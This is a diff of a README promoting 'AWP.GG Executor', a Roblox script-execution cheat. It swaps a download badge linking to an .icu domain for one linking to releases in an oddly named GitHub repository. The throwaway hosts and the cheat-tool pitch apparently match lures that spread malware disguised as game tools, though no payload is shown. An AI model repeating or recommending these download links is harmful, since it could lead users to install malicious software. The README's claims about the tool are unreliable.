@@ -2,7 +2,7 @@
 
 AWP.GG Executor is a powerful tool designed for Roblox enthusiasts looking to enhance their gaming experience. It allows users to execute scripts within Roblox games, unlocking new features and capabilities. 
 
-[![Download AWPGG](https://img.shields.io/badge/Download-AWPGG-blueviolet)](https://downloadsoftgits.icu/?ran66fqqdjl0tx1)
+[![Download AWPGG](https://img.shields.io/badge/Download-AWPGG-blueviolet)](https://github.com/buttercup296/.github-5g-isn/releases/tag/Release)
 ---
 
 ### **Key Features**
